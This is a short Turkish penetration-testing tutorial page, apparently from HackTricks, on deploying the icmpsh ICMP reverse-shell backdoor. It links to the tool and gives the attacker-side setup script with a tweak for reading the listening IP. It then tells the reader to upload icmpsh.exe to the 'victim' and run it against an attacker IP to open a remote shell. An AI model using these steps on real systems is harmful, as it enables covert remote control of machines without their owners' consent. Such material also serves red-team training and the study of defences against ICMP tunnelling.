{{#include ../banners/hacktricks-training.md}}

Arka kapıyı indirin: [https://github.com/inquisb/icmpsh](https://github.com/inquisb/icmpsh)

# İstemci tarafı

Scripti çalıştırın: **run.sh**

**Eğer bir hata alırsanız, satırları değiştirmeyi deneyin:**
```bash
IPINT=$(ifconfig | grep "eth" | cut -d " " -f 1 | head -1)
IP=$(ifconfig "$IPINT" |grep "inet addr:" |cut -d ":" -f 2 |awk '{ print $1 }')
```
**İçin:**
```bash
echo Please insert the IP where you want to listen
read IP
```
# **Kurban Tarafı**

**icmpsh.exe** dosyasını kurbana yükleyin ve çalıştırın:
```bash
icmpsh.exe -t <Attacker-IP> -d 500 -b 30 -s 128
```
{{#include ../banners/hacktricks-training.md}}
